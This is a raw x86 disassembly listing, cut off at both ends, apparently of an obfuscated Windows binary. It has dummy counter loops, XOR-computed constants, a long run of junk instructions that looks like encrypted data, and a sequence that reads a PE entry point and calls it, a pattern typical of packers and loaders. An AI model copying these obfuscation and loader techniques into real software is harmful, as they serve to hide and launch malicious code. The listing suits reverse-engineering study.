  406837:	mov    DWORD PTR [ebp-0x8],edx
  40683a:	mov    edx,DWORD PTR [ebp-0x20]
  40683d:	xor    edx,eax
  40683f:	mov    edi,0xffcd8d65
  406844:	sub    edi,edx
  406846:	add    edi,DWORD PTR [ebp-0x10]
  406849:	mov    edx,DWORD PTR [ebp-0x20]
  40684c:	mov    ebx,DWORD PTR [ebp-0x8]
  40684f:	xor    edx,eax
  406851:	add    edx,ecx
  406853:	imul   edx,ebx
  406856:	cmp    edx,edi
  406858:	jbe    0x40501f
  40685e:	pop    ebx
  40685f:	pop    edi
  406860:	leave  
  406861:	ret    0x8
  406864:	push   ebp
  406865:	mov    ebp,esp
  406867:	push   ecx
  406868:	mov    ecx,DWORD PTR ds:0x433847
  40686e:	mov    eax,ds:0x43385f
  406873:	sub    ecx,eax
  406875:	xor    ecx,DWORD PTR [ecx+eax*1]
  406878:	mov    ecx,DWORD PTR [ebp+0x8]
  40687b:	and    DWORD PTR ds:0x43376b,0x0
  406885:	jmp    0x406895
  40688a:	mov    eax,ds:0x43376b
  40688f:	inc    eax
  406890:	mov    ds:0x43376b,eax
  406895:	cmp    DWORD PTR ds:0x43376b,0x1d
  40689c:	jae    0x4068e6
  4068a2:	cmp    DWORD PTR ds:0x43376b,0xb
  4068a9:	jne    0x4068c9
  4068af:	push   0x8428
  4068b4:	push   0x433910
  4068b9:	push   0x433910
  4068be:	push   0x433867
  4068c3:	call   DWORD PTR ds:0x412378
  4068c9:	cmp    DWORD PTR ds:0x43376b,0xa
  4068d0:	jne    0x4068e1
  4068d6:	mov    eax,ds:0x43376b
  4068db:	inc    eax
  4068dc:	mov    ds:0x43376b,eax
  4068e1:	jmp    0x40688a
  4068e6:	mov    eax,0x7510854
  4068eb:	sbb    DWORD PTR ds:0x4337fb,0x433773
  4068f5:	xor    ecx,eax
  4068f7:	and    DWORD PTR ds:0x43382f,0x491f
  406901:	add    ecx,0x32729b
  406907:	mov    DWORD PTR ds:0x43371f,0x6297
  406911:	mov    DWORD PTR [ebp+0x10],ecx
  406914:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  40691b:	mov    ecx,0x4881
  406920:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  406927:	mov    ecx,0xf89c8532
  40692c:	push   esi
  40692d:	mov    DWORD PTR ds:0x4337b3,0x711c
  406937:	mov    DWORD PTR [ebp+0x10],0x70019f3
  40693e:	mov    DWORD PTR ds:0x433733,edi
  406944:	mov    esi,DWORD PTR [ebp-0x4]
  406947:	mov    DWORD PTR ds:0x4337b7,0x237d
  406951:	cmp    ecx,esi
  406953:	mov    DWORD PTR ds:0x4337f7,0x9b
  40695d:	je     0x406998
  406963:	and    DWORD PTR ds:0x433717,0x274d
  40696d:	mov    esi,DWORD PTR [ebp+0xc]
  406970:	xor    ecx,eax
  406972:	sub    DWORD PTR ds:0x4337c3,0x433713
  40697c:	xor    esi,eax
  40697e:	lea    ecx,[esi+ecx*1+0x32729b]
  406985:	xor    ecx,eax
  406987:	cmp    ecx,0xf89c8521
  40698d:	jne    0x40692d
  406993:	jmp    0x4069c6
  406998:	add    ecx,0xffcd8d65
  40699e:	mov    esi,ecx
  4069a0:	xor    esi,eax
  4069a2:	add    esi,DWORD PTR [ebp+0x8]
  4069a5:	mov    DWORD PTR [ebp+0x8],esi
  4069a8:	mov    esi,DWORD PTR [ebp+0x8]
  4069ab:	xor    esi,ecx
  4069ad:	xor    esi,eax
  4069af:	mov    eax,DWORD PTR [edx+0x194]
  4069b5:	mov    ecx,DWORD PTR [eax]
  4069b7:	mov    eax,DWORD PTR [ecx+0x3c]
  4069ba:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4069be:	add    eax,ecx
  4069c0:	mov    DWORD PTR [ebp+0x8],esi
  4069c3:	mov    DWORD PTR [ebp+0x10],eax
  4069c6:	mov    eax,DWORD PTR [ebp+0x10]
  4069c9:	pop    esi
  4069ca:	test   eax,eax
  4069cc:	jmp    0x406c4a
  4069d1:	gs aaa 
  4069d3:	jns    0x406a20
  4069d5:	dec    ecx
  4069d6:	jno    0x406a4d
  4069d8:	xor    DWORD PTR [ebp+0x366491c7],ecx
  4069de:	popf   
  4069df:	ror    ch,0x66
  4069e2:	(bad)  
  4069e3:	jle    0x406a63
  4069e5:	fistp  QWORD PTR [esi+edi*2+0x7e]
  4069e9:	xchg   ecx,eax
  4069ea:	dec    edx
  4069eb:	jbe    0x406987
  4069ed:	mov    WORD PTR [esi+0x1e],ds
  4069f0:	cmp    BYTE PTR ds:0x3ae8ac9f,dl
  4069f6:	daa    
  4069f7:	rcl    BYTE PTR [edx+ebp*1],cl
  4069fa:	dec    eax
  4069fb:	mov    esi,0x8b4fe5f
  406a00:	mov    ah,bl
  406a02:	sub    DWORD PTR [esi+eiz*8],0x52
  406a06:	xchg   esp,eax
  406a07:	cmp    BYTE PTR [edi-0x14],0x89
  406a0b:	clc    
  406a0c:	pop    esi
  406a0d:	pop    es
  406a0e:	ja     0x406a5f
  406a10:	test   DWORD PTR [edx+0x2308d7c],0xcb1c5d1b
  406a1a:	js     0x66c2eb7e
  406a20:	inc    esp
  406a21:	cmp    edi,DWORD PTR [ebx]
  406a23:	mov    al,0xd2
  406a25:	ja     0x406aa0
  406a27:	sbb    eax,0x6b326353
  406a2c:	repnz pop eax
  406a2e:	mov    DWORD PTR [eax],ebx
  406a30:	icebp  
  406a31:	mov    ch,0xe
  406a33:	jl     0x4069c5
  406a35:	or     BYTE PTR [edx+0x59d6f20e],0x95
  406a3c:	(bad)  
  406a3d:	cmp    al,0x7
  406a3f:	lods   eax,DWORD PTR ds:[esi]
  406a40:	cs cdq 
  406a42:	and    eax,0xe4d3093e
  406a47:	and    bh,ah
  406a49:	js     0x406a26
  406a4b:	xor    al,0x2
  406a4d:	les    ecx,FWORD PTR [esi+0x2f539035]
  406a53:	jbe    0x406a66
  406a55:	adc    dl,BYTE PTR [edx]
  406a57:	mov    ebx,0xb7783cc3
  406a5c:	lock or DWORD PTR [ecx],edi
  406a5f:	pop    edi
  406a60:	sbb    al,0x3d
  406a62:	cmp    cl,BYTE PTR [eax+ebx*1-0x48]
  406a66:	add    esi,esp
  406a68:	sbb    ebp,ecx
  406a6a:	icebp  
  406a6b:	lock sbb BYTE PTR [edi+0x7a],dl
  406a6f:	out    dx,eax
  406a70:	lea    eax,[edi]
  406a72:	xchg   ebx,eax
  406a73:	xchg   esp,eax
  406a74:	push   cs
  406a75:	pop    esp
  406a76:	sub    BYTE PTR [eax-0x657a3643],bl
  406a7c:	jl     0x406afc
  406a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a7f:	add    eax,0x84da3ce5
  406a84:	pop    ebp
  406a85:	js     0x406a63
  406a87:	cmp    dh,dl
  406a89:	jl     0x406a40
  406a8b:	out    dx,al
  406a8c:	adc    ah,bl
  406a8e:	scas   al,BYTE PTR es:[edi]
  406a8f:	mov    gs,WORD PTR [eax+0xa]
  406a92:	pop    ebx
  406a93:	loop   0x406af9
  406a95:	ss mov al,0x75
  406a98:	out    0xbc,al
  406a9a:	cmp    ah,cl
  406a9c:	in     eax,dx
  406a9d:	int    0x68
  406a9f:	sbb    edi,DWORD PTR [edi+0xe835336]
  406aa5:	dec    ebx
  406aa6:	dec    eax
  406aa7:	add    BYTE PTR [ebp-0x3fba29ce],al
  406aad:	adc    al,0x4b
  406aaf:	pop    ebx
  406ab0:	popf   
  406ab1:	(bad)  
  406ab2:	lea    eax,[edi+0x3d90ec26]
  406ab8:	mov    bl,0xd1
  406aba:	pop    gs
  406abc:	cmc    
  406abd:	jmp    0x86b5:0x35276de2
  406ac4:	jle    0x406a7a
  406ac6:	inc    esi
  406ac7:	dec    esi
  406ac8:	adc    eax,0x8fb86f06
  406acd:	(bad)  
  406ace:	cld    
  406acf:	in     al,dx
  406ad0:	cdq    
  406ad1:	pop    edi
  406ad2:	lea    eax,[edi]
  406ad4:	adc    eax,0xfd99c3e7
  406ad9:	(bad)  
  406ada:	xchg   ecx,eax
  406adb:	push   es
  406adc:	push   es
  406add:	jne    0x406ab8
  406adf:	push   edx
  406ae0:	(bad)  
  406ae1:	and    BYTE PTR [ecx-0x6d],dh
  406ae4:	mov    al,0xf3
  406ae6:	pop    eax
  406ae7:	out    dx,eax
  406ae8:	sub    DWORD PTR [edi+esi*8+0x33de4c04],0xffffff8e
  406af0:	aam    0x9b
  406af2:	inc    ebp
  406af3:	mov    BYTE PTR [edi],cl
  406af5:	xchg   BYTE PTR ds:0x3ff2fa50,dl
  406afb:	pop    es
  406afc:	leave  
  406afd:	push   ebp
  406afe:	mov    ?,WORD PTR [edx+0x37decc94]
  406b04:	sar    BYTE PTR [eax+0x30],cl
  406b07:	mov    ds:0x1f9fe350,eax
  406b0c:	rcl    BYTE PTR es:[ebx],0x80
  406b10:	aaa    
  406b11:	jo     0x406af2
  406b13:	in     eax,dx
  406b14:	les    edx,FWORD PTR [ecx-0x766c5bd2]
  406b1a:	sub    ch,bl
  406b1c:	jb     0x406b00
  406b1e:	std    
  406b1f:	inc    edx
  406b20:	imul   esp,DWORD PTR [ecx-0x46d7a5f],0xe7f506aa
  406b2a:	shr    DWORD PTR cs:[edi],1
  406b2d:	das    
  406b2e:	mov    edi,0xf04d0086
  406b33:	xchg   ebp,eax
  406b34:	mov    al,0x70
  406b36:	add    al,0xe7
  406b38:	pop    ecx
  406b39:	fstp   DWORD PTR [esi+0x669611f2]
  406b3f:	inc    eax
  406b40:	repz cwde 
  406b42:	cwde   
  406b43:	leave  
  406b44:	push   eax
  406b45:	(bad)  
  406b47:	push   ds
  406b48:	push   esi
  406b49:	jne    0x406b4c
  406b4b:	mov    al,0xb4
  406b4d:	sub    ebx,ecx
  406b4f:	sbb    cl,BYTE PTR [ecx]
  406b51:	push   esi
  406b52:	pop    ebx
  406b53:	push   edx
  406b54:	fld    DWORD PTR [esi+0x173322c5]
  406b5a:	xor    edx,0x3d
  406b5d:	mov    ah,0xe8
  406b5f:	inc    ecx
  406b60:	jmp    0x92ff:0x72ca9cf2
  406b67:	mov    ds:0x624e066d,eax
  406b6c:	arpl   WORD PTR [ecx+0xa],bx
  406b6f:	pop    ebx
  406b70:	adc    ebp,DWORD PTR [eax]
  406b72:	scas   al,BYTE PTR es:[edi]
  406b73:	in     al,dx
  406b74:	gs aam 0x2
  406b77:	sbb    al,0x24
  406b79:	pop    ss
  406b7a:	ja     0x406b03
  406b7c:	imul   edx,DWORD PTR [ecx-0x72],0xffffffa2
  406b80:	xor    edx,DWORD PTR ds:0xd3ac012d
  406b86:	fld    QWORD PTR [edx]
  406b88:	ds push ebx
  406b8a:	pop    ecx
  406b8b:	xor    BYTE PTR [edx],cl
  406b8d:	adc    al,0xab
  406b8f:	mov    cl,0x61
  406b91:	fmul   st,st(0)
  406b93:	jb     0x406b1a
  406b95:	and    ah,al
  406b97:	ror    DWORD PTR [edi+0x79eac419],0x80
  406b9e:	es jge 0x406b50
  406ba1:	icebp  
  406ba2:	mov    ch,0xc2
  406ba4:	clc    
  406ba5:	mov    eax,0xcf0fd4bc
  406baa:	lods   eax,DWORD PTR ds:[esi]
  406bab:	sbb    BYTE PTR [ebx],ch
  406bad:	xchg   esi,eax
  406bae:	test   BYTE PTR [eax+0x5d9d1b58],ah
  406bb4:	fcomp  DWORD PTR ds:0x14692bac
  406bba:	mov    ?,WORD PTR [esp+ecx*1+0x37]
  406bbe:	sti    
  406bbf:	mov    ch,0x54
  406bc1:	or     ch,BYTE PTR [eax]
  406bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bc4:	in     eax,0x40
  406bc6:	xor    DWORD PTR [ebp-0x5f9000cd],edi
  406bcc:	xchg   esi,eax
  406bcd:	pop    edx
  406bce:	into   
  406bcf:	jns    0x406bbe
  406bd1:	xor    al,0xbe
  406bd3:	jbe    0x406c17
  406bd5:	mov    gs,WORD PTR [edx*4-0x62f8470d]
  406bdc:	stos   DWORD PTR es:[edi],eax
  406bdd:	pop    ds
  406bde:	dec    edx
  406bdf:	popf   
  406be0:	mov    edx,0x38895597
  406be5:	jne    0x406b72
  406be7:	fs mov esp,0xca6c78d0
  406bed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bee:	xlat   BYTE PTR ds:[ebx]
  406bef:	mov    WORD PTR [edi+0x285e031b],ss
  406bf5:	push   edi
  406bf6:	sbb    ch,cl
  406bf8:	into   
  406bf9:	ds (bad) 
  406bfb:	ins    DWORD PTR es:[edi],dx
  406bfc:	or     cl,0xb8
  406bff:	sbb    BYTE PTR [edx+0x7bd4c890],ch
  406c05:	cwde   
  406c06:	push   ecx
  406c07:	xchg   esp,eax
  406c08:	xchg   esp,eax
  406c09:	dec    esi
  406c0a:	xor    eax,0x96a68607
  406c0f:	adc    al,0x2d
  406c11:	rcl    DWORD PTR [ebx-0x9],cl
  406c14:	xor    ebp,ebx
  406c16:	(bad)  
  406c17:	fbld   TBYTE PTR [edx]
  406c19:	xchg   esi,eax
  406c1a:	fstp   TBYTE PTR [edi+0x7d039ba]
  406c20:	fldcw  WORD PTR [ecx]
  406c22:	les    ebx,FWORD PTR [ebp+0x111b54e1]
  406c28:	adc    al,BYTE PTR ds:0x159e2965
  406c2e:	rcr    BYTE PTR [bx+di-0x33],0x5b
  406c33:	cmp    edi,ebp
  406c35:	push   edx
  406c36:	leave  
  406c37:	sbb    eax,0xb5274a1
  406c3c:	(bad)  
  406c3d:	dec    ebp
  406c3e:	inc    ecx
  406c3f:	xor    al,0xf0
  406c41:	iret   
  406c42:	(bad)  
  406c43:	shl    BYTE PTR [edx],1
  406c45:	loope  0x406c6f
  406c47:	mov    ebx,0x840f5290
  406c4c:	pushf  
  406c4d:	add    al,BYTE PTR [eax]
  406c4f:	add    bh,bh
  406c51:	xor    eax,0x413cb6
  406c56:	push   DWORD PTR ds:0x413a62
  406c5c:	mov    eax,DWORD PTR [edx+0x194]
  406c62:	push   DWORD PTR [eax]
  406c64:	mov    eax,DWORD PTR [ebp+0x10]
  406c67:	call   eax
  406c69:	jmp    0x406eef
  406c6e:	jmp    0x406eec
  406c73:	push   ebx
  406c74:	jo     0x406c41
  406c76:	es jmp 0xfbb1e021
  406c7c:	mov    edi,0xd0162bde
  406c81:	jmp    0x406c32
  406c83:	mov    edx,0x7cdf7e7e
  406c89:	jle    0x406d09
  406c8b:	in     eax,0x9c
  406c8d:	push   esi
  406c8e:	mov    edx,0xbfb529e7
  406c93:	mov    esi,0x2dc8dfc7
  406c98:	stos   BYTE PTR es:[edi],al
  406c99:	sahf   
  406c9a:	test   DWORD PTR [ebx-0x47074cab],0x1b0ae7d0
  406ca4:	(bad)  
  406ca5:	shr    DWORD PTR [ebp+0x29],cl
  406ca8:	mov    ecx,0xff75c048
  406cad:	leave  
  406cae:	ror    BYTE PTR [ebp-0x7f878d42],0x18
  406cb5:	popa   
  406cb6:	sub    eax,0xf5919b55
  406cbb:	mov    bl,0x34
  406cbd:	ret    
  406cbe:	jnp    0x406cf0
  406cc0:	push   edx
  406cc1:	test   eax,0x690923d0
  406cc6:	(bad)  
  406cc7:	xor    dh,ch
  406cc9:	push   eax
  406cca:	sub    al,0x6e
  406ccc:	test   ah,0xcc
  406ccf:	jae    0x406ced
  406cd1:	sbb    DWORD PTR [ecx+ebx*2+0x6b6bfd54],ebp
  406cd8:	mov    esi,0x54b51844
  406cdd:	jne    0x406cfa
  406cdf:	(bad)  
  406ce0:	pop    ds
  406ce1:	mov    edi,0xa8f1d94b
  406ce6:	stos   BYTE PTR es:[edi],al
  406ce7:	pusha  
  406ce8:	sahf   
  406ce9:	push   ecx
  406cea:	out    0x4e,al
  406cec:	jae    0x406cf9
  406cee:	xor    ah,BYTE PTR [edx-0x7123eff6]
  406cf4:	jnp    0x406d16
  406cf6:	pop    ebp
  406cf7:	(bad)  
  406cf8:	loop   0x406c88
  406cfa:	aaa    
  406cfb:	add    DWORD PTR [ebx+0x5e],edx
  406cfe:	or     ah,ch
  406d00:	call   0x87fb:0x52aaf993
  406d07:	loope  0x406cb6
  406d09:	(bad)  
  406d0a:	repnz pop esi
  406d0c:	pusha  
  406d0d:	call   0xf567:0xf6ddbcaf
  406d14:	pop    esp
  406d15:	retf   0x250c
  406d18:	call   0xe370:0x607509e
  406d1f:	leave  
  406d20:	mov    dh,0x64
  406d22:	mov    al,ds:0x99204757
  406d27:	loope  0x406d40
  406d29:	mov    esi,0xe44c7f52
  406d2e:	pop    ss
  406d2f:	repz js 0x406d1f
  406d32:	out    dx,eax
  406d33:	mov    DWORD PTR [eax-0x32248326],eax
  406d39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d3a:	mov    eax,ds:0x297025e6
  406d3f:	dec    ebp
  406d40:	outs   dx,DWORD PTR ds:[esi]
  406d41:	xor    eax,DWORD PTR [esi+0x49]
  406d44:	xchg   edi,eax
  406d45:	jmp    0x5c07:0xb58c3e73
  406d4c:	into   
  406d4d:	xor    ah,ch
  406d4f:	popf   
  406d50:	ficom  DWORD PTR [eax+0x1a]
  406d53:	fdiv   DWORD PTR [edx-0x5b]
  406d56:	cs (bad) 
  406d58:	fsubr  QWORD PTR [ebp+0x2184bf86]
  406d5e:	fdiv   QWORD PTR [ebp-0x1f34c351]
  406d64:	stc    
  406d65:	push   ss
  406d66:	add    ch,BYTE PTR [si+0x2181]
  406d6b:	push   edi
  406d6c:	loope  0x406dad
  406d6e:	pop    ecx
  406d6f:	mov    ah,0x62
  406d71:	add    DWORD PTR [edx-0x1],eax
  406d74:	stc    
  406d75:	inc    esi
  406d76:	retf   0x23b0
  406d79:	sti    
  406d7a:	aad    0xcb
  406d7c:	jo     0x406d0d
  406d7e:	fwait
  406d7f:	ret    
  406d80:	mov    bl,0x38
  406d82:	popf   
  406d83:	stos   BYTE PTR es:[edi],al
  406d84:	cli    
  406d85:	push   ebx
  406d86:	push   ss
  406d87:	fs sbb al,0x2e
  406d8a:	jns    0x406d9e
  406d8c:	lods   al,BYTE PTR ds:[esi]
  406d8d:	xchg   BYTE PTR [eax],dl
  406d8f:	dec    esp
  406d90:	and    ah,BYTE PTR [esi+0x3b7c3578]
  406d96:	out    dx,al
  406d97:	cmp    edx,DWORD PTR [ebx]
  406d99:	fistp  WORD PTR [edx]
  406d9b:	pop    esp
  406d9c:	push   ds
  406d9d:	pop    ebp
  406d9e:	inc    eax
  406d9f:	cmp    BYTE PTR [edx-0x53],al
  406da2:	mov    ecx,0xde718e64
  406da7:	sub    dl,BYTE PTR [edi]
  406da9:	ja     0x406d69
  406dab:	add    al,0xcc
  406dad:	mov    dl,0x77
  406daf:	aas    
  406db0:	int    0x7d
  406db2:	ret    0xcca
  406db5:	dec    edx
  406db6:	jbe    0x406e09
  406db8:	sbb    BYTE PTR [ecx+ecx*8-0x60],dh
  406dbc:	or     al,0x8d
  406dbe:	cmp    al,0x73
  406dc0:	stos   DWORD PTR es:[edi],eax
  406dc1:	call   0x85c6:0x3643b8e2
  406dc8:	mov    ds:0x3723f457,eax
  406dcd:	dec    edi
  406dce:	and    eax,DWORD PTR gs:[eax+0x59]
  406dd2:	(bad)  [ebx]
  406dd4:	xor    eax,0x8fa77536
  406dd9:	int    0x1f
  406ddb:	imul   DWORD PTR [eax]
  406ddd:	fwait
  406dde:	pop    ds
  406ddf:	add    eax,0xffeb8e98
  406de4:	nop
  406de5:	push   edx
  406de6:	mov    cl,0xc6
  406de8:	mov    dh,0xb3
  406dea:	popa   
  406deb:	pop    edx
  406dec:	adc    eax,0x72d84b0
  406df1:	shl    dl,0xcf
  406df4:	xor    al,0xd8
  406df6:	mov    ecx,DWORD PTR ds:0x8fdbab4a
  406dfc:	popa   
  406dfd:	add    eax,DWORD PTR gs:[edi-0x5607548d]
  406e04:	cmp    al,0xe9
  406e06:	mov    ah,0xb0
  406e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e09:	fsub   DWORD PTR [edx+edi*4+0x1]
  406e0d:	les    edx,FWORD PTR [ebx+0x43]
  406e10:	pushf  
  406e11:	sahf   
  406e12:	xchg   esi,eax
  406e13:	mov    cl,0x31
  406e15:	fst    QWORD PTR [ecx]
  406e17:	sbb    BYTE PTR [eax],dl
  406e19:	jae    0x406da8
  406e1b:	xchg   ah,al
  406e1d:	sti    
  406e1e:	(bad)  [ebx-0x1d]
  406e21:	fcom   DWORD PTR [esi-0x2b]
  406e24:	dec    edi
  406e25:	(bad)  
  406e26:	sub    ecx,DWORD PTR [edi+0x11]
  406e29:	mov    ecx,0x7da7db08
  406e2e:	mov    dh,0xdd
  406e30:	inc    ebp
  406e31:	ret    0xed1f
  406e34:	fiadd  DWORD PTR [esi-0xa]
  406e37:	jl     0x406e99
  406e39:	adc    BYTE PTR [eax+edi*4+0x2e],bh
  406e3d:	jo     0x406e5e
  406e3f:	inc    edi
  406e40:	(bad)  
  406e41:	hlt    
  406e42:	pop    esi
  406e43:	and    esi,ebp
  406e45:	xchg   BYTE PTR [edi+eiz*4],bh
  406e48:	mov    cl,BYTE PTR [esi+edi*8]
  406e4b:	xor    eax,0xbfdce187
  406e50:	inc    esi
  406e51:	enter  0x371,0xf
  406e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e56:	stos   BYTE PTR es:[edi],al
  406e57:	push   ecx
  406e58:	push   eax
  406e59:	jl     0x406e88
  406e5b:	inc    eax
  406e5c:	mov    ecx,0xfe19822c
  406e61:	mov    fs,WORD PTR [ebx]
  406e63:	cld    
  406e64:	ins    BYTE PTR es:[edi],dx
  406e65:	mov    ecx,0x83d0c816
  406e6a:	fwait
  406e6b:	and    BYTE PTR [edx+esi*4],bl
  406e6e:	ins    DWORD PTR es:[edi],dx
  406e6f:	and    dl,dl
  406e71:	inc    eax
  406e72:	jl     0x406e94
  406e74:	inc    edx
  406e75:	jl     0x406e74
  406e77:	jns    0x406e09
  406e79:	push   0xfffffffa
  406e7b:	pop    esi
  406e7c:	or     eax,0x91e55e41
  406e81:	loopne 0x406ee5
  406e83:	pop    ebx
  406e84:	mov    ds:0xcb725b24,al
  406e89:	push   0xffffffd0
  406e8b:	sbb    edi,edi
  406e8d:	dec    ecx
  406e8e:	sub    dh,BYTE PTR [eax]
  406e90:	out    0x25,al
  406e92:	add    BYTE PTR [edx+0x1c35a6cd],ch
  406e98:	cmp    cl,BYTE PTR [ebx]
  406e9a:	xor    eax,0x38d6c7e1
  406e9f:	or     esi,DWORD PTR [esi-0x40e5d38e]
  406ea5:	repnz mov BYTE PTR [edx-0xeef95a4],dl
  406eac:	pop    edi
  406ead:	in     al,dx
  406eae:	or     dl,BYTE PTR [edi-0x1e538437]
  406eb4:	pop    esi
  406eb5:	xlat   BYTE PTR ds:[ebx]
  406eb6:	cmp    ah,BYTE PTR [ebp+0x671b9e99]
  406ebc:	rol    BYTE PTR [edx],1
  406ebe:	wbinvd 
  406ec0:	pop    edi
  406ec1:	(bad)  
  406ec2:	iret   
  406ec3:	(bad)  
  406ec4:	in     al,0x9e
  406ec6:	std    
  406ec7:	(bad)  
  406ec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eca:	pop    edi
  406ecb:	sar    bl,cl
  406ecd:	mov    ebp,0x703e5263
  406ed2:	iret   
  406ed3:	in     eax,dx
  406ed4:	sub    eax,0x936cac0d
  406ed9:	in     al,0x7a
  406edb:	cmp    edx,DWORD PTR [esi-0x17]
  406ede:	cmp    al,0xee
  406ee0:	mov    ebp,0x310eb9b
  406ee5:	mov    BYTE PTR [ebp-0x6bff30b1],ch
  406eeb:	adc    ecx,DWORD PTR [ebx-0x3d36efbb]
  406ef1:	or     al,0x0
  406ef3:	push   ebp
  406ef4:	mov    ebp,esp
  406ef6:	sub    esp,0x28
  406ef9:	mov    DWORD PTR ds:0x43376f,0x71e2
  406f03:	push   0x413d5e
  406f08:	call   DWORD PTR ds:0x412420
  406f0e:	cmp    BYTE PTR [eax],0x0
  406f11:	mov    DWORD PTR ds:0x433723,0xa08
  406f1b:	je     0x406f32
  406f21:	and    DWORD PTR ds:0x43382f,0x433713
  406f2b:	xor    eax,eax
  406f2d:	jmp    0x407466
  406f32:	push   0x413da6
  406f37:	add    DWORD PTR ds:0x43382f,0x4337a7
  406f41:	call   DWORD PTR ds:0x4121d4
  406f47:	mov    DWORD PTR ds:0x4337eb,0x6fd9
  406f51:	cmp    eax,0xa
  406f54:	mov    DWORD PTR ds:0x4337bb,0x485d
  406f5e:	jl     0x406f21
  406f64:	add    ecx,DWORD PTR ds:0x433827
  406f6a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  406f71:	mov    DWORD PTR ds:0x4337fb,0x11
  406f7b:	cmp    DWORD PTR ds:0x4337fb,0x0
  406f82:	je     0x406fdd
  406f88:	cmp    DWORD PTR ds:0x4337fb,0x5
  406f8f:	jne    0x406fa5
  406f95:	push   0x7487
  406f9a:	push   0x433867
  406f9f:	call   DWORD PTR ds:0x4121c0
  406fa5:	cmp    DWORD PTR ds:0x4337fb,0x6
  406fac:	jne    0x406fbf
  406fb2:	mov    ecx,DWORD PTR ds:0x4337fb
  406fb8:	dec    ecx
  406fb9:	mov    DWORD PTR ds:0x4337fb,ecx
  406fbf:	xor    ecx,ecx
  406fc1:	add    ecx,DWORD PTR ds:0x4337fb
  406fc7:	dec    ecx
  406fc8:	mov    DWORD PTR ds:0x4337fb,ecx
  406fce:	jmp    0x406f7b
  406fd3:	adc    DWORD PTR ds:0x43372b,0x7658
  406fdd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  406fe4:	mov    DWORD PTR ds:0x433773,0x15
  406fee:	cmp    DWORD PTR ds:0x433773,0x0
  406ff5:	je     0x407051
  406ffb:	cmp    DWORD PTR ds:0x433773,0x2
  407002:	jne    0x40701d
  407008:	push   0x43377b
  40700d:	push   0x433803
  407012:	push   0x3143
  407017:	call   DWORD PTR ds:0x412360
  40701d:	cmp    DWORD PTR ds:0x433773,0x3
  407024:	jne    0x407039
  40702a:	xor    ecx,ecx
  40702c:	or     ecx,DWORD PTR ds:0x433773
  407032:	dec    ecx
  407033:	mov    DWORD PTR ds:0x433773,ecx
  407039:	mov    ecx,DWORD PTR ds:0x433773
  40703f:	dec    ecx
  407040:	mov    DWORD PTR ds:0x433773,ecx
  407046:	jmp    0x406fee
  40704b:	sbb    ecx,DWORD PTR ds:0x4337ff
  407051:	lea    eax,[ebp-0x20]
  407054:	mov    DWORD PTR ds:0x43372f,0x1c
  40705e:	cmp    DWORD PTR ds:0x43372f,0x0
  407065:	je     0x4070a1
  40706b:	cmp    DWORD PTR ds:0x43372f,0x2b
  407072:	jne    0x407089
  407078:	push   DWORD PTR [ebp-0xc]
  40707b:	push   0x43372f
  407080:	push   DWORD PTR [ebp-0x24]
  407083:	call   DWORD PTR ds:0x4121c4
  407089:	mov    ecx,DWORD PTR ds:0x43372f
  40708f:	dec    ecx
  407090:	mov    DWORD PTR ds:0x43372f,ecx
  407096:	jmp    0x40705e
  40709b:	xor    ecx,0x624a
  4070a1:	mov    DWORD PTR [ebp-0x14],eax
  4070a4:	lea    eax,[ebp-0x1c]
  4070a7:	mov    DWORD PTR [ebp-0x10],eax
  4070aa:	adc    ecx,eax
  4070ac:	mov    eax,ds:0x413bde
  4070b1:	mov    ecx,DWORD PTR ds:0x433747
  4070b7:	mov    ecx,DWORD PTR [ecx]
  4070b9:	xor    DWORD PTR ds:0x4337b3,ecx
  4070bf:	mov    eax,DWORD PTR [eax+0x1c8]
  4070c5:	or     DWORD PTR ds:0x433733,0x1d95
  4070cf:	mov    eax,DWORD PTR [eax]
  4070d1:	sub    ecx,0x7a4e
  4070d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4070da:	add    DWORD PTR ds:0x43376f,0x433727
  4070e4:	push   ebx
  4070e5:	push   esi
  4070e6:	sub    DWORD PTR ds:0x43371f,ebx
  4070ec:	mov    esi,0x7510854
  4070f1:	and    DWORD PTR ds:0x4337a7,0x0
  4070fb:	mov    ebx,DWORD PTR ds:0x4337a7
  407101:	inc    ebx
  407102:	mov    DWORD PTR ds:0x4337a7,ebx
  407108:	cmp    DWORD PTR ds:0x4337a7,0x7
  40710f:	jne    0x407128
  407115:	push   DWORD PTR [ebp-0x1c]
  407118:	push   0x8eb0
  40711d:	push   0x3be9
  407122:	call   DWORD PTR ds:0x4121c8
  407128:	cmp    DWORD PTR ds:0x4337a7,0x6
  40712f:	jne    0x407144
  407135:	xor    ebx,ebx
  407137:	xor    ebx,DWORD PTR ds:0x4337a7
  40713d:	inc    ebx
  40713e:	mov    DWORD PTR ds:0x4337a7,ebx
  407144:	cmp    DWORD PTR ds:0x4337a7,0x15
  40714b:	jb     0x4070fb
  407151:	and    DWORD PTR ds:0x4337eb,edi
  407157:	xor    eax,esi
  407159:	sub    ebx,DWORD PTR ds:0x43371b
  40715f:	push   edi
  407160:	xor    ebx,0x561f
  407166:	mov    edi,0x32729b
  40716b:	mov    DWORD PTR ds:0x433843,0x1c
  407175:	cmp    DWORD PTR ds:0x433843,0x0
  40717c:	je     0x407271
  407182:	cmp    DWORD PTR ds:0x433843,0x25
  407189:	jne    0x40719d
  40718f:	push   0x43389a
  407194:	push   DWORD PTR [ebp-0x20]
  407197:	call   DWORD PTR ds:0x412008
  40719d:	mov    ebx,DWORD PTR ds:0x433843
  4071a3:	dec    ebx
  4071a4:	mov    DWORD PTR ds:0x433843,ebx
  4071aa:	jmp    0x407175
  4071af:	and    DWORD PTR ds:0x43371f,0x0
  4071b9:	jmp    0x4071cb
  4071be:	mov    ebx,DWORD PTR ds:0x43371f
  4071c4:	inc    ebx
  4071c5:	mov    DWORD PTR ds:0x43371f,ebx
  4071cb:	cmp    DWORD PTR ds:0x43371f,0x1a
